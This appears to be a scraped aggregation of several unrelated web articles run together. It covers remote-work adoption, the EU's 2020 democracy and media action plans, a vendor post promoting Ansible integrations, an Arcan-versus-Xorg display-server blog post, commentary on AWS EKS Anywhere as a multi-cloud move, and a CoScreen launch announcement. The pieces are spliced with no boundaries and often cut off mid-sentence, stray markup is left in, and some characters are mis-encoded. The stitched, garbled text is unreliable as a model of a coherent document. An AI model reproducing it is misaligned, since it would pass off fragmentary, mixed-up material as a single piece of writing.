<p>The final stage is having fully distributed companies. While this seems like a no-brainer from remote first, it's another involved step. This step is tricky is because remote-first companies have the luxury of choosing which parts of the job will happen on-premise and which other areas can be remote. This possibility allows them to move to remote the "easier" 80% of the jobs and keep on-premise the part that is not easy to change. Logistics, such as sending off Christmas presents, is not easy if people are working remotely. Retreats become necessary to be able to know your teammates personally.</p>
<p>All in all, there's a clear path to move any company from the office to telework:</p>
<ol>
<li>You need to trust your people and know that it is possible to have people working without being in the office.</li>
<li>Migrate the tools and affect your office's culture, so everyone works with remote-friendly applications and devices, even in the office.</li>
<li>Migrate people from the office to their remote locations while fixing and improving the tools and processes that need change to take these steps. </li>

<p>The European Commission <a href="https://ec.europa.eu/commission/presscorner/detail/en/ip_20_2250" target="_blank">announced</a> a series of proposals Thursday aimed at combating online disinformation, boosting the region’s media sector and protecting upcoming elections from outside interference.</p>



<p>The initiatives, dubbed the <a href="https://ec.europa.eu/transparency/regdoc/rep/1/2020/EN/COM-2020-790-F1-EN-MAIN-PART-1.PDF" target="_blank">European Democracy Action Plan (EDAP)</a> and <a href="https://ec.europa.eu/digital-single-market/en/news/europes-media-digital-decade-action-plan-support-recovery-and-transformation" target="_blank">Media and Audiovisual Action Plan (MAAP)</a> respectively, come roughly two weeks before Brussels <a href="https://www.politico.eu/tag/digital-services-act/">is expected to publish</a> a separate set of legislative proposals that will target the dominance of a few, mostly American, tech companies and place greater responsibilities on social media companies about what is posted on their networks.</p>



<p>The precursor announcements Thursday are aimed at tackling some of the problems straining democratic institutions across the Continent — from how online falsehoods circulate around elections to the need to support the media sector which has been hard hit by the COVID-19 pandemic.</p>



<p>“Democracy cannot be taken for granted; it needs to be nurtured and protected,” Věra Jourová, the Commission vice president who oversaw the proposals, said in a statement. "Our plan aims at protecting and promoting meaningful participation of citizens, empowering them to make their choices in the public space freely, without manipulation."</p>



<p>Despite the rhetoric, no actual legislation was published Thursday. </p>



<p>Instead, it is a statement of political intent from European Union officials that greater safeguards need to be put in place, both to counter online disinformation and protect the bloc's media and audiovisual sector. Specific rules, including forcing the likes of Facebook, Google and Twitter to be more accountable over how falsehoods are shared on their networks, will be announced next year.</p>



<p>The EDAP centers on <a href="https://www.politico.eu/article/brussels-targets-online-political-advertising/">placing limits</a> on how political ads on social media can be targeted at would-be voters, outlining a new code of conduct for platforms around disinformation and highlighting how such measures will work with the upcoming EU Digital Services Act — proposals aimed at placing greater responsibilities on these platforms that will be published December 15.</p>



<p>The MAAP focuses on the news media sector and audiovisual entertainment, including video games and virtual reality. Because of the pandemic, news publishers lost 30-80 percent of advertising revenues and TV channels 20 percent in this year’s second quarter, the document reads. Movie theaters have also suffered massive losses.</p>



<p>“We are committed to help the media sector weather the current storm and challenges brought by the crisis, and to take full advantage of the opportunities offered by the digital transformation in both the short-term and long-term," Margrethe Vestager, the Commission's vice president in charge of digital strategy, said in a statement.</p>



<p>POLITICO broke down the important parts of the announcement. Here's what you need to know.</p>



<h3>1. Links to Digital Services Act</h3>



<p>The EDAP is expected to work hand-in-hand with the upcoming Digital Services Act. That initiative, according to Thursday’s announcement, will include transparency rules that companies such as Facebook and Google must follow over how their algorithms promote potentially dangerous content. It will also create a so-called “co-regulatory backstop” that will involve companies, regulators and civil society groups working together to police the new system.</p>



<p>As part of that process, the DSA will mandate that large platforms assess the risks that illegal content may have on their users and take appropriate, unnamed, steps to address those concerns, including how the companies are curbing the spread of disinformation online. Potential sanctions, including financial penalties, could be levied if companies do not comply. More details will come on December 15.</p>



<h3>2. New rules on disinformation</h3>



<p>To help address the new requirements outlined in the DSA, the Commission wants to revise its code of conduct on disinformation, a voluntary set of transparency rules that all the major social networks have already signed up to. That will include creating specific metrics for combating online falsehoods that will be overseen by regulators, developing rules to stop the amplification of disinformation across the platforms and providing greater data access to outside groups who will monitor how the companies are complying with the obligations.</p>



<p>The revised code of conduct will be the carrot to offset the potential regulatory sticks in the DSA. If companies sign up to the new code of practice, which will still be voluntary, they can use their participation as a means to offset the new obligations for platforms over assessing the potential risks of harmful content spreading on their networks. If they don’t, Facebook, Google, Twitter and others may open themselves up to greater regulatory scrutiny that will be unveiled in the DSA.</p>



<h3>3. Crackdown on online campaigning</h3>



<p>The Commission has political ads that run on social media in its sights. Next year, officials will propose new legislation aimed at boosting transparency over how such partisan paid-for messages circulate online. That includes plans to limit so-called microtargeting, or the use of sophisticated data profiles of would-be voters to target them with tailored messages, though an outright ban is not expected.&nbsp;</p>



<p>The goal is to have a new regulatory system in place by the European Parliament elections in 2024, and will include categories of political actors who would fall into these new transparency mechanisms. It is still not defined what would constitute a political ad — something that has become a hotly debated topic as political groups try to dodge efforts to police their online activities.</p>



<h3>4. Protecting elections</h3>



<p>EU officials want to promote greater cooperation between countries on how to keep domestic elections safe. The Commission already oversees a group of national experts who share best practices. That will be extended to include measures to protect election infrastructure and cybersecurity expertise, and will involve war-gaming exercises to test the resilience of local elections to potential outside threats.</p>



<p>Brussels similarly is keen to promote the potential of online voting, something already part of the Commission’s mandate. It will also outline proposals next year to add online hate crime and hate speech to a list of crimes that fall within the EU’s legal mandate.</p>



<h3>5. Media pluralism</h3>



<p>Jourová, who’s also in charge of rule of law, said the new proposals would "increase protection of journalists and fight disinformation and interference, while fully protecting freedom of speech."&nbsp;</p>



<p>The Commission will set up a Media Ownership Monitor to increase the transparency of media ownership and develop measures for the “fair allocation of state advertising.” Brussels will also analyse national media diversity and concentration rules to assess how to ensure pluralism online, “especially in the light of the growing role of online platforms.” </p>



<h3>6. Easier access to EU and private money&nbsp;</h3>



<p>In the MAAP, the Commission wants to ensure the audiovisual and news media sector can access EU money. In the first quarter of next year, EU media companies will have access to a new interactive tool to guide them through the various support instruments, including Creative Europe that has a sub-program dedicated to media.&nbsp;</p>



<p>The Commission also seeks to alleviate “a gap in equity financing for audiovisual,” which is estimated to be between roughly €400 million and €650 million<strong> </strong>per year. The EU’s executive body will set up a dedicated investment platform for EU audiovisual production and distribution companies, backed by funds coming from Creative Europe MEDIA and InvestEU, to attract private investment. The goal is to generate investments of €400 million in the next seven years.&nbsp;</p>



<p>European news media companies will get easier access to loans via the backing of the InvestEU guarantee. The Commission will establish a European News Media Forum to engage with media regulatory authorities, journalists, press councils, civil society and international organizations.&nbsp;</p>



<h3>7. Green and cross-border sticks&nbsp;</h3>



<p>The MAAP includes a lot of carrots for the audiovisual sector, but also a few sticks.&nbsp;</p>



<p>Earlier this week, the Commission said it <a href="https://www.politico.eu/?p=1533361">would not extend</a> the scope of the so-called <a href="https://oeil.secure.europarl.europa.eu/oeil/popups/ficheprocedure.do?reference=2016/0152(COD)&amp;l=en" target="_blank">geo-blocking regulation</a> to copyright-protected material, such as movies and TV shows. Brussels, though, wants to launch a dialogue with the audiovisual industry in the first half of next year to “agree on concrete steps to improve the access to and availability of audiovisual content across borders in the EU.” If progress is not sufficient, “legislative intervention” is on the table.&nbsp;</p>



<p>The audiovisual sector is also expected to become greener in the coming years. In the first half of 2021, the Commission will set up a forum with the industry — including online streaming platforms — and audiovisual funds to discuss best practices and green standards to make the media sector more sustainable. The EU’s executive body will also work on best practices on green production and green provision of services.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>Integration is a crucial aspect of any modern business. As businesses in every
industry are managing increasingly more complex systems, a shift towards
unified automation and DevOps principles is essential to stay competitive.</p>
<p>With software integration, it’s easy to connect disparate systems and
applications, enabling your users to bring different products and departments
together, making their business processes more efficient and less painful.</p>
<p>Read on as we explore software integration, reveal the benefits of building
integrations for your product, and discuss the best practices you can follow.</p>
<h2 id="what-is-software-integration">What is software integration?</h2>
<p>Integration in software engineering is the combination of various software
subsystems into a single, unified architecture. This process of creating
integrated systems facilitates greater functionality and performance across
all the separate components.</p>
<p><a href="https://chiefmartec.com/2020/05/proof-platform-saas-apps-median-15-integrations/" title="Pandium SaaS study">A recent study by Pandium</a> on the 1,000 fastest-growing SaaS
(software-as-a-service) companies found that these companies have a median of
15 integrations. App platforms like Zapier typically have over 500
integrations. Configuration management tools like <a href="https://puppet.com/" title="Puppet's home page">Puppet</a>, <a href="https://www.chef.io/" title="Chef's home page">Chef</a> and
<a href="https://www.ansible.com/" title="Ansible's home page">Ansible</a> have hundreds of integrations. Ansible, for example, even has more
than 4.000 such integrations (Ansible modules).</p>
<h2 id="integration-types">Integration Types</h2>
<p>There are four key types of software integration, each of which serves a
distinct purpose:</p>
<h3 id="1-system-integration-and-automation">1. System integration and automation</h3>
<p>System integration is a core element of software integration, which enables an
application to communicate with all the existing services and applications
within a companyâ€™s IT ecosystem.</p>
<p>For example, Ansible integration for AWS cloud services enables seamless
connectivity with a userâ€™s AWS cloud. By using the AWS Ansible Collection, AWS
users can efficiently manage Amazon resources, build a secure VPC, and deploy
documents, which improves their user experience with AWS Cloud.</p>
<h3 id="2-api">2. API</h3>
<p>An Application Programming Interface (API) is an interface that allows
separate systems to communicate.  The usersâ€”like third-party app developers
and business partnersâ€”donâ€™t need to know how the software works on the
back-end, as they simply use the API to leverage the appâ€™s functionalities.</p>
<p>You can think of an API like a waiter at a restaurant. Users can view the
available options on the menu and order what they like. They don’t see what
happens in the kitchenâ€”they just place an order and receive the finished meal.</p>
<p>In this way, an API serves as a bridge between applications that use
integration to transmit data seamlessly, without any complexity. A good
example is the payment processing platform, Stripe. Another example is Ansible
Tower offering API-based integration for external systems like CI/CD.</p>
<h3 id="3-webhooks">3. Webhooks</h3>
<p>Webhooks are user-defined HTTP callbacks that are triggered by specific events
to link applications together.</p>
<p>When the trigger event occurs in the source website, the webhook recognizes
the event, collects data, and sends it to the specified URL as an HTTP
request. It’s possible to set up a webhook event on one website to trigger
actions on another website.</p>
<p>This type of integration provides access to real-time data at any time. Also,
as the process updates information whenever events occur, businesses can
automate data collection.</p>
<h3 id="4-isc">4. ISC</h3>
<p>Integration Services Components (ISC) live on a webserver to simplify
connections with local management tools. These components are not code-based,
and so, the business only needs cloud access to integrate ISC.</p>
<p>An ISC allows users to access data directories and on-premise software tools
for business intelligence and asset management without the need to import
large files. In many ways, it is an out-of-the-box solution. However, you must
be familiar with the local database to set up an ISC integration.</p>
<h2 id="why-should-you-build-integrations-for-your-product">Why should you build integrations for your product?</h2>
<p>The most prominent benefit is to simplify complex business processes by
unifying them with system integrations. However, itâ€™s far from being the only
one. Read on to discover 6 benefits for building product integrations:</p>
<h3 id="ease-the-complexity-of-users-systems">Ease the complexity of userâ€™s systems</h3>
<p>Nowadays it is not enough to build the best in breed products. Customers are
seeking ways to integrate your products efficiently into their workflows. It
is not uncommon to find solutions from multiple vendors for a single area of
operations. Having to learn how to manage each one requires time and money. By
offering integrations, however, you are enabling your customers to unify all
the technologies seamlessly.</p>
<h3 id="speed-up-the-adoption-of-your-product">Speed up the adoption of your product</h3>
<p>Introducing new products into an existing environment always poses barriers,
even when you have a far superior product. This is mainly rooted in the fact
that people do not like the change.</p>
<p>Using integrations with industry adopted tools like Ansible or Puppet
simplifies the onboarding of your products into organizations already using
such tools. Integrating them into their workflows will cause less friction as
their Ops teams will already be familiar with the core platform unifying
access across the whole ecosystem.</p>
<h3 id="faster-growth-of-your-user-base">Faster growth of your user base</h3>
<p>Onboarding a new solution is only the first step of a company-wide adoption
process. One of the key requirements is the ease of adding new users and thus
leveraging the new solution to its full potential.</p>
<p>Letâ€™s take a look at the example of <a href="https://steampunk.si/blog/ansible-integration-helps-sensu-reach-more-users/" title="Sensu and Ansible integration benefits">Sensu</a>. Their solution is an
Observability Pipeline that delivers Monitoring-as-Code for any cloud
infrastructure. Before integrating with Ansible, they were facing two
challenges - a drop off during the onboarding process and a sub-optimal user
base within already onboarded businesses.</p>
<p>With the Sensu Ansible Content Collection in place, Sensu customers can now
get better business results by expanding its usage and adding additional users
with ease.</p>
<h3 id="improve-the-customer-experience">Improve the customer experience</h3>
<p>Improving your solutionâ€™s customer experience is a mix of different changes,
but one thing stays constant - familiarity.</p>
<p>If businesses can work with already widely adopted configuration management
tools (such as Ansible) for onboarding and using your product, thereâ€™s a good
chance that the familiarity will simplify its early stages of use, improving
the first impression and the overall experience.</p>
<p>The real impact of familiarity results in saved time by leveraging already
existing know-how and not investing resources into learning new tech or
processes.</p>
<p>This brings us back to the <a href="https://steampunk.si/blog/ansible-integration-helps-sensu-reach-more-users/" title="Sensu and Ansible integration benefits">Sensu</a> example - they managed to significantly
improve their product experience by offering an Ansible Content Collection.
Hereâ€™s a quote from their client:</p>
<p>“I tried your product a couple of months ago” but they didnâ€™t finish setting
it up for one reason or another, “But then I saw that there was an Ansible
Collection for it, so I tried again and I got it set up and started using it
right away across thousands of devices.”</p>
<h3 id="grow-your-business-with-integrations">Grow your business with integrations</h3>
<p>All of the above lead to growing your business faster and more efficiently
through such integrations. Think of an integration as an additional sales
channel. Your product appears in the marketplace of the product you are
integrating it with.</p>
<p>For example, Ansible Content Collections are available on <a href="https://galaxy.ansible.com/" title="Ansible Galaxy">Ansible
Galaxy</a>. However, those are community-generated Collections that can
be downloaded at no cost. If youâ€™d really like to attract new customers with a
high-quality, supported, enterprise-grade integration, certifying your
Collection is a must. This assures your customers the integration meets the
standards of the Ansible Automation Platform. And we can help you with that.</p>

<h3 id="it-minimizes-customer-churn">It Minimizes Customer Churn</h3>
<p>Customers expect easy-to-use solutions in the modern age. System integrations
make that possible by giving businesses the ability to unify all their
solutions with their preferred configuration management tool. If your product
becomes an integral part of a company’s solution network from day one, thereâ€™s
no incentive to churn at any point in time.</p>
<p>Regardless of the industry, your business can gain a lot from adopting a
customer-centric approach to all operations. With integrations, you can offer
a great customer experience that encourages people to buy more and return for
future purchases.</p>
<p>A <a href="https://blog.cloud-elements.com/why-api-integration-is-crucial-for-software-companies" title="Cloud Elements study on API integrations">study from Cloud Elements</a> found that companies that offer
pre-built integrations can reduce customer churn by 60% and increase customer
lifetime value by 15%.</p>
<h2 id="best-integration-practices">Best Integration Practices</h2>
<p>Integration presents organizations with valuable new business opportunities,
but it is not a guarantee of success on its own. If your company is going to
achieve its goals, you need a well-defined strategy AND a high-quality
integration.</p>
<p>Here are three best practices for software integration to help you maximize
its potential:</p>
<h3 id="good-integrations-start-with-customers">Good Integrations Start With Customers</h3>
<p>The most successful customer-centric organizations build their success on
simple principles: they listen to their customers and put them first.</p>
<p>When it comes to building integrations for your applications, research your
customers. Ask yourself and your customers questions like:</p>
<ul>
<li>What systems and applications do they use now?</li>
<li>What do they want to integrate with?</li>
<li>How could automation and integration make their life easier or make their
business better?</li>
</ul>
<p>When you know your audience at a deep level, you have a blueprint to guide
your internal processes, including your sales and marketing campaigns. With
this guide, you can develop integrations that are tailored to your customersâ€™
needs.</p>
<h3 id="prioritize-long-term-roadmaps-ahead-of-quick-hacks">Prioritize Long-term Roadmaps Ahead of Quick Hacks</h3>
<p>For an integration to deliver the true value to your customers it must be
planned just as much as your core product.</p>
<p>To deliver benefits presented in the previous section, an integration should
not be a side job or a quick hack. You should develop integrations with
long-term business objectives in mind. With …</p></div></div>

<br/>
December 3, 2020 | https://arcan-fe.com/2020/12/03/arcan-versus-xorg-feature-parity-and-beyond/ | <a href="https://web.archive.org/web/*/https://arcan-fe.com/2020/12/03/arcan-versus-xorg-feature-parity-and-beyond/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<p>This is the follow-up to the <a href="https://arcan-fe.com/2018/10/17/arcan-versus-xorg-approaching-feature-parity/">‘Arcan versus Xorg: approaching feature parity’ </a>article which is recommended reading if you have not done so already.&nbsp;</p>



<p>After that article, there was only one (and a half) real feature left to safely claim parity and that can be covered rather quickly. Thereafter we can nibble on the bites that are in Arcan, but not in Xorg — the reason for the difference in scope is best saved for a different time, although it is a good one.</p>



<p>First, let us not forget that there are more vectors for qualities that are significant to users than just features. Client compatibility is something that has been much lower on the list of priorities, yet is an important quality.</p>



<p>The reason is that prematurely adding support for something like a new display server backend to a toolkit, game engine or windowing library without both necessary and sufficient features in place will lead to a scattered <em>actual</em> feature set. There will be theoretical features, and then the features some clients actually might use some version or interpretation of. These two sets will slip further and further apart unless each affected project has exceptionally alert developers, and the reference implementation having basic hygiene in place regarding conformance verification and validation tools.</p>



<p>We have experimented with such implementations, of course, but that was mainly to test the design and current implementation; to find out where our APIs gets annoying to use, so that nobody else suffers.</p>



<p>The other reason for downplaying compatibility is that client applications has strong biases on how things are “supposed” to work, with the worst offenders being just ‘GUI toolkits’. Small changes can have large impact on application design and you are forced to adapt a certain worldview that lessens your perspective. As a trivial thought exercise, just consider something like a smartphone in a world where touch input was not invented, but eye tracking was flawless.</p>



<p>To re-emphasise the point of the Arcan project as such. It is not, and never was, to reinvent X. The principle program (<a href="https://www.divergent-desktop.org/blog/2020/08/10/principles-overview/">12 principles for a diverging desktop future</a>) say as much. The project is about showing that there were <em>other paths </em>not taken by the big players, and hint at what those paths offered when followed to their logical conclusion.</p>



<p>Most of the lessons in here are not amazing discoveries from diligent research. Rather, they are uncovering wisdom hidden inside the circuits of elderly arcade machines. It is the reason for header-bar image here still being a cropped PCB from that era.</p>



<p>Enough editorialising, towards the Xorgcism! This will again be painfully long and dry. Appy-polly-loggies in advance for that. Quicknav links are as follows:</p>



<ul><li><a href="#network">Network Transparency</a></li><li><a href="#drawing">Drawing API</a></li><li><a href="#migration">Migration and Recovery</a></li><li><a href="#hook">Hook Scripts</a></li><li><a href="#alternate">Alternate Representations</a></li><li><a href="#launching">Application Launching</a></li><li><a href="#state">State Blocks</a></li><li><a href="#audio">Audio</a></li><li><a href="#input">Advanced Input and VR</a></li><li><a href="#xorg_tui">Path from curses and terminals – TUI</a></li></ul>



<h2 id="network">Network Transparency</h2>



<p>The main missing feature was about network support. Luckily I do not have to cover that again — there are already two articles on the topic: one that digs into <a href="https://arcan-fe.com/2018/11/16/the-x-network-transparency-myth/">the situation in Xorg</a>; one that covers <a href="https://arcan-fe.com/2020/10/28/a12-advancing-network-transparency-on-the-desktop/">our solution</a>. If there is anything left to re-emphasise, it would be that the networking part is a completely separate process that <em>reinterprets</em> the networked client data.</p>



<p>There are three reasons for this – this first is that optimal local rendering and optimal remote rendering are incompatible ideas that were historically similar enough that the discrepancy could be tolerated. Nowadays we want <em>both</em> and that takes a different architecture where everyone involved adapts to which one of the two that is currently desired.</p>



<p>The second is for <em>security</em>; the client IPC is a privilege boundary. Network access is yet another privilege boundary. Mixing multiple privilege boundaries within the same process practically merges the two into one in this case, greatly reducing security. <em>Even if</em> you have a separate network process, should all it is doing be proxy-patching packets, you gain very little <em>actual</em> protection. This is because your ‘network process’ is just yet another router or proxy on the way to the real parser in the privileged process, and the only primitive often needed (writing to a file-descriptor) is hard or impossible to ‘sandbox’. </p>



<p>The third is for resilience. Recall the lengths we have previously gone to in order to have<a href="https://arcan-fe.com/2017/12/24/crash-resilient-wayland-compositing/"> crash resilience</a>. There has been much more work done in that direction since the linked article, and one of the final stages is to make sure client state can gracefully survive GPU loss and, should the circumstances permit, machine loss. These things do not work cleanly as an after-thought – the consequences permeate everything.</p>



<h2 id="drawing">Drawing API</h2>



<p>The other feature left was the fabled <strong>drawing</strong> API – to which I would also consider font management — as that lies somewhere in the middle; fonts were already covered in the previous article as part of the section on ‘mixed-DPI’ drawing.</p>



<p>The thing is, Arcan <em>started</em> with a<a href="https://github.com/letoram/arcan/tree/master/doc"> drawing API</a> – initially for specifying interactive animated presentations, documents and some ehrm, darker things of which only beer and cocktails in shady bars might, briefly, bring back to the surface. The display server angle turned into a detour and necessary evil after certain actors could not ‘leave well-enough alone’.</p>



<p>Anyhow, the ‘animated presentations’ bit brought in all kinds of input devices, as well as audio and video. Video parsing and decoding is a finicky process at the best of times, and the typical libraries for this were obvious exploitation vectors. This meant that process separation with least-privilege was clearly needed. With that you get a realtime/media IPC system, so clean that up, add buttons and there is your basic display server.</p>



<p>As a side-note: Having a ‘drawing API’ on the consumer side is not hard per se and, in fact, is the strategy that won, with local raster being a distant fallback. If you want accelerated rendering through OpenGL or Vulkan, it ends up being command buffers (hey, draw commands!) sent to the GPU that will actually turn it into a signal and/or pixels – the drawing won’t happen in-process through the grace of “put pixel”. You could add non-accelerated drawing to Wayland with a one line addition to wl_shm defining a buffer format as <a href="https://en.wikipedia.org/wiki/Scalable_Vector_Graphics">SVG</a>, wouldn’t that be interesting 😉</p>



<p>J’accuse! – I hear you zoladats triumphantly proclaim. That is not for the clients to<strong> </strong>use now is it<strong>‽</strong>. So lwa-ts me explain the two sides to this story.  A longer version with charts and code and everything can be found in the article on <a href="https://arcan-fe.com/2017/10/05/awk-for-realtime-multimedia/">AWK for Multimedia</a>.</p>



<p>The big bit about a drawing API is the level of abstraction it provides. If it is at the low level of  “putPixel()”, you lose —<em> the framebuffer is dead, long live the framebuffer</em>. If it is about “bind set of uniforms, buffers, gpu program and supply commands” you get what the high end graphics libraries already provide. The real challenge is finding the right set of mid-level functions that provide something more without getting morbidly obese to the scale of whatever flavour ‘absorb all’ UI toolkit that is in fashion these days; to understand how, where and when the JS/HTML5/CSS/… soup fail.</p>



<p>Thus, a network friendly, compact, mid-level drawing++ related API is the target. One that can be used out-of-process and as an “intermediate language” (think LLVM-IR) for higher level UI components or document interpreters to render to, while at the same time having the feature set expected of ‘web-app’ like targets.</p>



<p>The “++” represents the process control, audio and meta-IPC routing that is also necessary to cover the span of what is expected of ‘a desktop’. The processing of these commands translate to another intermediate layer, ‘AGP’ which is a simplified subset of OpenGL that was needed as a decoupling mechanism to eventually switch to-/provide- Vulkan and Software rasterisation. It aims at at a network friendly level at about the quality of DOOM3/WebGL, not great, but thereafter video compression starts to win out.</p>



<p>The following figure illustrates the different ways of running Arcan to cover all combinations of ‘drawing API’:</p>



<figure><a href="https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png"><img data-attachment-id="8006" data-permalink="https://arcan-fe.com/execmodes-1/" data-orig-file="https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png" data-orig-size="952,676" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="execmodes-1" data-image-description="" data-medium-file="https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png?w=300" data-large-file="https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png?w=640" src="https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png?w=952" alt="" srcset="https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png 952w, https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png?w=150 150w, https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png?w=300 300w, https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png?w=768 768w" sizes="(max-width: 952px) 100vw, 952px"></a></figure>



<p>So Arcan can be a client to itself, although it is a separate binary (arcan_lwa –  (<strong>L</strong>ight<strong>w</strong>eight-<strong>a</strong>pplication) marked as ArcanLW in the figure.</p>



<p>ArcanLW will connect to Arcan ‘as a display server’ and act like a normal client. The side benefit here is that if you know how to write an app with the one, you can write or patch the window manager in the other. You get one API to control, manipulate or inspect all the routing for the entirety of your desktop. It privileges separates by design, it has been stable for years.</p>



<p>The last piece to this puzzle is to be able to provide RPC like access to this API. Here is why Lua matters more.</p>



<p>For those not in the know, exposing a C API to the Lua VM is about as simple as it gets and it fits other low level calling conventions; register the symbol name and function pointer of the function in the VM namespace; pop arguments from the stack based on the desired types; process; push the function return to the stack. </p>



<p>It can get more involved than this, but not by much. That actually doubles as a protocol decoder, thus it can be used as a decoupling mechanism. Define a bytecode and t<em>here is your \out of process\ drawing/WM API to bind to other languages.</em></p>



<h2 id="migration">Migration and Recovery</h2>



<p>While we did brush upon crash recovery in the previous post, as well as a <a href="https://arcan-fe.com/2017/12/24/crash-resilient-wayland-compositing/">previous article on the subject</a> – there is still a lot to it. Enough work has been done since to warrant yet another article.</p>



<p>People aware of some GTK history knows that it actually has the underused ability to jump between X Displays. The ‘underused’ part can probably be blamed on the, ehrm, ergonomics of spinning up and maintaining multiple X servers to jump between. Politely put, it was not for the faint of heart. </p>



<p>It is a good idea in principle, …</p></div></div>

AWS’s stated rationale for expanding access to their managed Kubernetes service is all about hybrid cloud, which traditionally has meant “your old busted servers plus AWS’s shiny goodness.”</p><p>But wait … EKS Anywhere<em>? </em>Does that really mean <em>anywhere</em>?</p><p>Could it mean … Azure?</p><p>Lo and behold, <a href="https://www.protocol.com/aws-multicloud-era">Protocol has obtained confirmation</a> that EKS Anywhere (and technically ECS Anywhere, but let’s be real, if you want to run on multiple cloud providers you’re using Kubernetes) <strong>will support workloads running on Azure and GCP as well as private data centers</strong>. AWS is giving you a single pane of glass that will let you roll out config updates, instrument monitoring, and connect other app services to container workloads on your cloud of choice.</p><p>That’s right: AWS just rolled out a multi-cloud container management service.</p><p>You are now permitted thirty seconds to pick your jaw off the floor.</p><h2 id="h-what-does-aws-gain-from-doing-this">What does AWS gain from doing this?</h2><p>This marks … shall we say … a bit of a departure from AWS’s classic “one cloud to rule them all” rhetoric. After all, at various other times in Tuesday’s re:Invent keynote Andy Jassy unleashed <a href="https://aws.amazon.com/rds/aurora/babelfish/">a frontal assault on Microsoft SQL Server</a>, dunked gleefully on archnemesis-turned-punching-bag Oracle, and found GCP so unthreatening that he closed his presentation, without comment, on a song lyric that used “Google” as a verb.</p><p>And yet multi-cloud is here to stay, and Jassy knows it.</p><p>Check out my recent piece <a href="https://cloudirregular.substack.com/p/aws-hearts-multi-cloud-its-gonna">“AWS Hearts Multi-Cloud”</a> for a full analysis of why, but here’s the gist. <a href="https://cloudpundit.com/2020/09/18/the-multicloud-gelatinous-cube/"><strong>Multi-cloud is a gravitational inevitability for enterprises</strong></a>. ACG’s recent <a href="https://acloudguru.com/blog/news/a-cloud-guru-unveils-state-of-cloud-learning-report">State of Cloud Learning Report</a> found that while about 75% of cloud shops still use AWS as their primary cloud provider, the same 75% also have at least some workloads running on Azure or another cloud. Could be due to acquisition, service envy, bet-hedging, or simple lack of coordination – or all of the above. Reality is messy and getting more so.</p><p>AWS has a huge head start on the rest of the cloud industry, but 75% of people won’t think of AWS as their “primary” cloud provider forever. Not when there are so many best-of-breed services to choose from, both on other clouds and on focused SaaS providers like Snowflake and Datadog. And certainly not given that plenty of industries have active incentive to avoid deep integration with a cloud provider owned by Amazon.</p><p>So AWS has a limited window of opportunity to keep that central status in cloud teams’ hearts. Providing higher-level, cross-cloud management tools is the easiest way to do it. The other cloud providers certainly get this; Azure isn’t hamstrung by an inability to admit the validity of AWS workloads, and they’re rushing into the breach with tools like Arc and Sentinel.</p><h2 id="h-this-is-only-the-beginning">This is only the beginning</h2><p>Really, the amazing thing is that AWS spun the “Anywhere” releases so adroitly, and described them so diffusely, that it took a day to confirm that multi-cloud was really their intent. And they can’t keep playing both sides much longer. They need to signal to large customers that yes, they get that Azure isn’t going away, and they’ll provide the tools to continue deserving the status of <em>preferred </em>cloud provider even if they can’t be the <em>only </em>cloud provider.</p><p>If you think that’s a bridge too far, you haven’t been paying attention to what makes AWS tick. I closed my last multi-cloud piece by pointing out that AWS created ECS because they have great engineers; they sell EKS because they are smart. As long as they are willing to cannibalize their own offerings in pursuit of customer value, they will remain hard to beat.</p><figure><div><blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">My ears are perking up at <a href="https://twitter.com/ajassy?ref_src=twsrc%5Etfw">@ajassy</a>'s comments about working with third parties, not being afraid of cannibalizing yourself, etc … are we revving up to the announcement of AWS's much-ballyhooed multicloud play? <a href="https://twitter.com/hashtag/reinvent?src=hash&amp;ref_src=twsrc%5Etfw">#reinvent</a></p>— Forrest Brazeal @re:Invent 2020 (@forrestbrazeal) <a href="https://twitter.com/forrestbrazeal/status/1333806720993333250?ref_src=twsrc%5Etfw">December 1, 2020</a></blockquote> </div></figure><p>Lo and behold, Jassy echoed the same themes in his keynote. And while he never used the word “multi-cloud” (not yet!), you can be sure that EKS Anywhere isn’t a one-off or an accident. It’s the first glimpse of a massive strategic shift. Because once you realize what yesterday’s emphasis on “hybrid, open-source” rhetoric really means, it’s clear that AWS’s multi-cloud play is just beginning.</p></div></div></div>]]>

				<p>Today is as big day for us as we're launching the entirely newly designed &amp; developed 1.0 version of CoScreen for macOS and our private beta for Windows.

Now we want more teams to benefit from CoScreen and are therefore offering CoScreen entirely for free for the next six months.</p><blockquote><em>"CoScreen makes coding, pairing and video chatting as easy as a single click while keeping all our existing dev tools."</em><br><strong>M<em>ichaël Ohayon, Development Manager at Publicis Sapient</em></strong></blockquote><h2 id="the-struggle-of-remote-engineering-teams">The struggle of remote engineering teams</h2><p>Today's video chat solutions are great if you enjoy awkward full-screen conversations, but are a productivity killer for development teams. The pandemic has turned endless, boring in-office meetings into endless, boring video calls.

